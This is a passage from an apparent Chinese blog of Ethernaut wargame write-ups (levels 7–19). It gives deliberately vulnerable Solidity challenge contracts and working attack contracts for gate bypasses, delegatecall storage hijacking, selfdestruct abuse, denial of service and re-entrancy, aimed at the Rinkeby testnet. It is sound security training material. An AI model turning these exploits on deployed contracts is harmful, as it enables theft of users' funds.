class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender !&#x3D; tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; x :&#x3D; extcodesize(caller()) &#125;</span><br><span class="line">    require(x &#x3D;&#x3D; 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) &#x3D;&#x3D; uint64(0) - 1);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant &#x3D; tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>一样的有三个函数修饰器需要满足，我们依旧分开来说</p><ul><li><strong>require(msg.sender != tx.origin);</strong><br>这个和上一个的第一个条件一样，不再赘述，建一个合约就行。</li><li><p><strong>uint x</strong><br><strong>assembly { x := extcodesize(caller()) }</strong><br><strong>require(x == 0);</strong><br>这里涉及到了solidity中的汇编语言，<a href="https://solidity-cn.readthedocs.io/zh/develop/assembly.html#" target="_blank" rel="noopener">参考文档</a>，在这里<code>caller</code>是调用的发起者，<code>extcodesize(a)</code>会返回地址 a 的代码大小。<br>关于这点，需要使用一个特性绕过：当合约正在执行构造函数constructor并部署时，其extcodesize为0。换句话说，如果我们在constructor中调用这个函数的话，那么extcodesize(caller())返回0，因此可以绕过检查。</p></li><li><p><strong>require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);</strong><br>这个条件其实就是一个简单的异或，我们只需要反过来异或一次算出来的结果就是key<br/></p></li></ul><p>攻击合约:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract attack&#123;</span><br><span class="line">    address target;</span><br><span class="line">    constructor(address _adr) public&#123;</span><br><span class="line">        target &#x3D; _adr;</span><br><span class="line">        bytes8 password &#x3D; bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^  uint64(0) - 1);</span><br><span class="line">        target.call(abi.encodeWithSignature(&quot;enter(bytes8)&quot;,password));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="15-Naught-Coin"><a href="#15-Naught-Coin" class="headerlink" title="15 Naught Coin"></a>15 Naught Coin</h2><p>这关考查对ERC20的了解<br>先看代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;https:&#x2F;&#x2F;github.com&#x2F;OpenZeppelin&#x2F;openzeppelin-contracts&#x2F;blob&#x2F;release-v3.2.0&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line"> contract NaughtCoin is ERC20 &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; string public constant name &#x3D; &#39;NaughtCoin&#39;;</span><br><span class="line">  &#x2F;&#x2F; string public constant symbol &#x3D; &#39;0x0&#39;;</span><br><span class="line">  &#x2F;&#x2F; uint public constant decimals &#x3D; 18;</span><br><span class="line">  uint public timeLock &#x3D; now + 10 * 365 days;</span><br><span class="line">  uint256 public INITIAL_SUPPLY;</span><br><span class="line">  address public player;</span><br><span class="line"></span><br><span class="line">  constructor(address _player) ERC20(&#39;NaughtCoin&#39;, &#39;0x0&#39;) public &#123;</span><br><span class="line">    player &#x3D; _player;</span><br><span class="line">    INITIAL_SUPPLY &#x3D; 1000000 * (10**uint256(decimals()));</span><br><span class="line">    &#x2F;&#x2F; _totalSupply &#x3D; INITIAL_SUPPLY;</span><br><span class="line">    &#x2F;&#x2F; _balances[player] &#x3D; INITIAL_SUPPLY;</span><br><span class="line">    _mint(player, INITIAL_SUPPLY);</span><br><span class="line">    emit Transfer(address(0), player, INITIAL_SUPPLY);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) &#123;</span><br><span class="line">    super.transfer(_to, _value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; Prevent the initial owner from transferring tokens until the timelock has passed</span><br><span class="line">  modifier lockTokens() &#123;</span><br><span class="line">    if (msg.sender &#x3D;&#x3D; player) &#123;</span><br><span class="line">      require(now &gt; timeLock);</span><br><span class="line">      _;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">     _;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>光看这个函数修饰器是没有漏洞可言的，但问题是，ERC20有两个转账函数，题目中只对<code>transfer</code>这一个函数做了修饰，也就是说，我们可以使用另一个函数进行转账-<code>transferFrom</code></p><ul><li>解题步骤<br>直接在控制台操作即可，但要注意，在转账操作之前我们需要先approve<br>val=’1000000000000000000000000’<br>addr=’0x5B38Da6a701c568545dCfcB03FcB875f56beddC4’<ol><li>contract.approve(player,val)</li><li>contract.transferFrom(player,addr,val)</li></ol></li></ul><h2 id="16-Preservation"><a href="#16-Preservation" class="headerlink" title="16 Preservation"></a>16 Preservation</h2><p>这关是对delegatecall漏洞的考查，大家可以看我对delegatecall的另一篇文章<a href="../Delegatecall.html">delegatecall杂谈</a><br>先看代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Preservation &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; public library contracts </span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner; </span><br><span class="line">  uint storedTime;</span><br><span class="line">  &#x2F;&#x2F; Sets the function signature for delegatecall</span><br><span class="line">  bytes4 constant setTimeSignature &#x3D; bytes4(keccak256(&quot;setTime(uint256)&quot;));</span><br><span class="line"></span><br><span class="line">  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123;</span><br><span class="line">    timeZone1Library &#x3D; _timeZone1LibraryAddress; </span><br><span class="line">    timeZone2Library &#x3D; _timeZone2LibraryAddress; </span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  &#x2F;&#x2F; set the time for timezone 1</span><br><span class="line">  function setFirstTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; set the time for timezone 2</span><br><span class="line">  function setSecondTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Simple library contract to set the time</span><br><span class="line">contract LibraryContract &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; stores a timestamp </span><br><span class="line">  uint storedTime;  </span><br><span class="line"></span><br><span class="line">  function setTime(uint _time) public &#123;</span><br><span class="line">    storedTime &#x3D; _time;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>由于delegatecall的执行环境是当前合约，所以如果要调用的函数内有修改变量的操作，将会导致自身的<strong>对应储存位上</strong>的变量被恶意修改，具体可以参考我的另一篇博客。<br/><br>利用这一点，我们可以实现攻击：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract attack &#123;</span><br><span class="line">    address public timeZone1Library;</span><br><span class="line">    address public timeZone2Library;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    function setTime(uint _time) public &#123;</span><br><span class="line">        owner &#x3D; address(_time);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>由于在perservation里，owner是在第2个存储位，所以我们这里需要两个变量来”占位”,这样就可以做到恶意修改被攻击合约的owner的目的。</p><ul><li>解题步骤</li></ul><ol><li>执行<code>setFirstTime</code>函数，将我们的攻击合约地址作为参数传进去，可以看到此时timeZone1Library已经变为我们攻击合约的地址。<br><img src="1.jpg" alt=""><br><img src="2.jpg" alt=""></li><li>再次执行<code>setFirstTime</code>，此时调用的就是我们的攻击合约了，我们只需要把我们自己的地址作为参数传进去，就可以完成攻击。</li></ol><h2 id="17-Recovery"><a href="#17-Recovery" class="headerlink" title="17 Recovery"></a>17 Recovery</h2><p>这关考查对区块链浏览器的使用和destroy函数<br>先看代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin&#x2F;contracts-ethereum-package&#x2F;contracts&#x2F;math&#x2F;SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Recovery &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F;generate tokens</span><br><span class="line">  function generateToken(string memory _name, uint256 _initialSupply) public &#123;</span><br><span class="line">    new SimpleToken(_name, msg.sender, _initialSupply);</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  &#x2F;&#x2F; public variables</span><br><span class="line">  string public name;</span><br><span class="line">  mapping (address &#x3D;&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; constructor</span><br><span class="line">  constructor(string memory _name, address _creator, uint256 _initialSupply) public &#123;</span><br><span class="line">    name &#x3D; _name;</span><br><span class="line">    balances[_creator] &#x3D; _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; collect ether in return for tokens</span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    balances[msg.sender] &#x3D; msg.value.mul(10);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; allow transfers of tokens</span><br><span class="line">  function transfer(address _to, uint _amount) public &#123; </span><br><span class="line">    require(balances[msg.sender] &gt;&#x3D; _amount);</span><br><span class="line">    balances[msg.sender] &#x3D; balances[msg.sender].sub(_amount);</span><br><span class="line">    balances[_to] &#x3D; _amount;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; clean up after ourselves</span><br><span class="line">  function destroy(address payable _to) public &#123;</span><br><span class="line">    selfdestruct(_to);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>题目中给到了一个合约地址，是<code>Recovery</code>的地址，题目中说创建者通过Recovery创建了一个SimpleToken，然后把地址给忘了，要我们找到这个地址并且把里面的钱弄出来。很容易，通过区块链浏览器就可以找到他创建的<code>SimpleToken</code>。<br/><br>在 <a href="https://rinkeby.etherscan.io/" target="_blank" rel="noopener">https://rinkeby.etherscan.io/</a> 上搜索Recovery的地址，然后我们就可以看到他的创建合约交易，点进去就可以找到合约地址。<br><img src="3.jpg" alt=""><br>得到地址后，我们只需要执行合约的自毁函数即可<br/><br>攻击合约：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line">contract attack&#123;</span><br><span class="line">    address payable target;</span><br><span class="line">    address payable owner;</span><br><span class="line">    constructor(address payable _target, address payable _own) public&#123;</span><br><span class="line">        target &#x3D; _target;</span><br><span class="line">        owner &#x3D; _own;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function dosome() public &#123;</span><br><span class="line">        target.call(abi.encodeWithSignature(&quot;destroy(address)&quot;,owner));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><blockquote><p>在执行dosome()方法的时候最好把交易的gaslimit调高一点，我在执行时如果不调gaslimit是会执行失败的，如图：<br><img src="4.jpg" alt=""></p></blockquote><h2 id="18-Magic-Number"><a href="#18-Magic-Number" class="headerlink" title="18 Magic Number"></a>18 Magic Number</h2><p>这是一个考察solidity操作码的题目<br>先看代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract MagicNum &#123;</span><br><span class="line"></span><br><span class="line">  address public solver;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function setSolver(address _solver) public &#123;</span><br><span class="line">    solver &#x3D; _solver;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;*</span><br><span class="line">    ____________&#x2F;\\\_______&#x2F;\\\\\\\\\_____        </span><br><span class="line">     __________&#x2F;\\\\\_____&#x2F;\\\&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;\\\___       </span><br><span class="line">      ________&#x2F;\\\&#x2F;\\\____\&#x2F;&#x2F;&#x2F;______\&#x2F;&#x2F;\\\__      </span><br><span class="line">       ______&#x2F;\\\&#x2F;\&#x2F;\\\______________&#x2F;\\\&#x2F;___     </span><br><span class="line">        ____&#x2F;\\\&#x2F;__\&#x2F;\\\___________&#x2F;\\\&#x2F;&#x2F;_____    </span><br><span class="line">         __&#x2F;\\\\\\\\\\\\\\\\_____&#x2F;\\\&#x2F;&#x2F;________   </span><br><span class="line">          _\&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;\\\&#x2F;&#x2F;____&#x2F;\\\&#x2F;___________  </span><br><span class="line">           ___________\&#x2F;\\\_____&#x2F;\\\\\\\\\\\\\\\_ </span><br><span class="line">            ___________\&#x2F;&#x2F;&#x2F;_____\&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;__</span><br><span class="line">  *&#x2F;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>部署一个只有 10 个 opcode 的合约，该合约在调用后返回 42。<br>因此我们必须使用字节码手动编写一个程序</p><h2 id="19-Alien-Codex"><a href="#19-Alien-Codex" class="headerlink" title="19 Alien Codex"></a>19 Alien Codex</h2><p>又是一道关于内存布局的题目</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ethernaut </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ethernaut 题解 07-12</title>
      <link href="/2022-11-03-ethernaut02/"/>
      <url>/2022-11-03-ethernaut02/</url>
      
        <content type="html"><![CDATA[<h1 id="Ethernaut靶场刷题记录-7-12"><a href="#Ethernaut靶场刷题记录-7-12" class="headerlink" title="Ethernaut靶场刷题记录(7-12)"></a>Ethernaut靶场刷题记录(7-12)</h1><hr><pre><code>author：Thomas_Xu</code></pre><h2 id="07-Force"><a href="#07-Force" class="headerlink" title="07 Force"></a>07 Force</h2><p>这道题是为了考查我们对自毁函数<code>selfdestruct</code>的认识<br>先看代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Force &#123;&#x2F;*</span><br><span class="line"></span><br><span class="line">                   MEOW ?</span><br><span class="line">         &#x2F;\_&#x2F;\   &#x2F;</span><br><span class="line">    ____&#x2F; o o \</span><br><span class="line">  &#x2F;~____  &#x3D;ø&#x3D; &#x2F;</span><br><span class="line"> (______)__m_m)</span><br><span class="line"></span><br><span class="line">*&#x2F;&#125;</span><br></pre></td></tr></table></figure><br>这就是一个空合约，题目想要我们给这个合约转一笔账，可我们知道，一个没有任何函数的合约是没有办法接收转账的。者就用到了自毁函数<code>selfdestruct</code></p><blockquote><p>自毁函数selfdestruct：<br>    当我们调用这个函数时，它会使合约无效化并删除该地址的字节码，然后它会把合约里剩余的资金发送给参数指定的地址，比较特殊的是这笔资金的发送将无视合约的fallback函数。（因为之前提到，如果合约收到一笔没有任何函数可以处理的资金时，就会调用fallback函数，而selfdestruct函数无视这一点，也就是资金会优先由selfdestruct函数处理）</p></blockquote><p>我们只需要自己写一个新合约，往里面存一点测试币，然后调用自毁函数<code>selfdestruct</code>将参数设置为此合约的地址，我们合约里的token<br>就会转到此合约当中。<br/><br>攻击合约如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Attck&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">receive() payable external&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">function dosome() public payable&#123;</span><br><span class="line">    selfdestruct(0x0F8AaD423dc5aE12382CEc67412dADb6e2b0eFF3);&#x2F;&#x2F;Force的地址</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>解题步骤</li></ul><ol><li>直接使用metamask给我自己的攻击合约转账<br><img src="01.png" alt=""></li><li>执行攻击合约的dosome函数</li><li>通关</li></ol><h1 id="09-King"><a href="#09-King" class="headerlink" title="09 King"></a>09 King</h1><p>这是一个Dos攻击（拒绝服务）型的漏洞<br>先看代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line"></span><br><span class="line">  address payable king;</span><br><span class="line">  uint public prize;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public payable &#123;</span><br><span class="line">    owner &#x3D; msg.sender;  </span><br><span class="line">    king &#x3D; msg.sender;</span><br><span class="line">    prize &#x3D; msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt;&#x3D; prize || msg.sender &#x3D;&#x3D; owner);</span><br><span class="line">    king.transfer(msg.value);</span><br><span class="line">    king &#x3D; msg.sender;</span><br><span class="line">    prize &#x3D; msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function _king() public view returns (address payable) &#123;</span><br><span class="line">    return king;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这是一个类似于拍卖的合约<br>题目的意思其实就是说让我们在成功报价后，想办法让别人无法对你的报价再进行竞拍。因为刚好前两天才系统性的了解了拒绝服务DDOS攻击，这道题就变得很容易。</p><blockquote><p>因为这个竞拍合约需要向上一个竞拍者转账后才能完成竞拍成功（完成king的交换），那我们不让他转账成功不就可以永远不被替换了嘛，需要我们创建一个攻击合约，而此合约需要fallable和receive函数不能设置为payable，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract AttackKing &#123;</span><br><span class="line"></span><br><span class="line">    constructor(address payable _victim) public payable &#123;</span><br><span class="line">        _victim.call.gas(1000000).value(msg.value)(&quot;&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>在此攻击合约中我们不写任何receive fallback函数，那么默认就是没有payable修饰的，自然也就接收不了转账。当然，也可以在receive中用revert()语句去终止交易。</p><ul><li>解题步骤</li></ul><ol><li>先用<code>web3.eth.getStorageAt(&#39;0x2814Cd87DdF364D7A5Ef9BAC507fdad131956647&#39;,1)</code>查看一下当前竞拍值是多少<br><img src="03.png" alt=""><br>在这里可以看到是0.001ether，那么我们就需要提供大于0.001ether的报价才能成为king</li><li>在创建攻击合约时，同时存0.0011个ether进去(如果你测试币多的话直接传1ether就行)<br><img src="02.jpg" alt=""></li><li>通关</li></ol></blockquote><h2 id="10-Re-Entrancy"><a href="#10-Re-Entrancy" class="headerlink" title="10 Re-Entrancy"></a>10 Re-Entrancy</h2><p>顾名思义，这是一个重入漏洞<br>先看代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#39;@openzeppelin&#x2F;contracts-ethereum-package&#x2F;contracts&#x2F;math&#x2F;SafeMath.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address &#x3D;&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  function donate(address _to) public payable &#123;</span><br><span class="line">    balances[_to] &#x3D; balances[_to].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _who) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw(uint _amount) public &#123;</span><br><span class="line">    if(balances[msg.sender] &gt;&#x3D; _amount) &#123;</span><br><span class="line">      (bool result,) &#x3D; msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</span><br><span class="line">      if(result) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -&#x3D; _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们可以注意到withdraw函数里面很明显是存在重入漏洞的，（在更改全局变量之前进行了外部调用）于是我们利用这个漏洞写出攻击合约：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract attack &#123;</span><br><span class="line"></span><br><span class="line">    address payable target;</span><br><span class="line">    uint amount &#x3D; 1000000000000000 wei;</span><br><span 